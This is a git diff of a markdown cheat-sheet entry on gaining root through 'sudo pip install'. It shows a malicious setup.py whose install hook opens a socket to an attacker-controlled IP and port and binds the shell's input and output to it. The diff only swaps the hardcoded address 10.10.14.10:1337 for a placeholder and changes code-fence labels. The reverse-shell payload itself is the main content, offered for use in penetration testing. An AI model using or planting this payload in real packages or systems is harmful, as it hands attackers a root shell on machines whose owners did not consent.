@@ -4,14 +4,13 @@ date: 2024-7-5
 tags: ["pip", "pip3", "python", "sudo", "privesc"]
 ---
 
----
 ### SUDO
 
 #### 1. Create a setup.py
 
 <div>
 
-```python
+```console
 #!/usr/bin/env python3
 
 from setuptools.command.install import install
@@ -23,7 +22,7 @@ import subprocess
 class Exploit(install):
     def run(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("10.10.14.10",1337)) # CHANGE HERE
+        s.connect(("<LOCAL_IP>",<LOCAL_PORT>)) # CHANGE HERE
         os.dup2(s.fileno(),0)
         os.dup2(s.fileno(),1)
         os.dup2(s.fileno(),2)
@@ -42,7 +41,7 @@ setup(
 
 <div>
 
-```bash
+```console
 # Run
 sudo pip install .
 ```
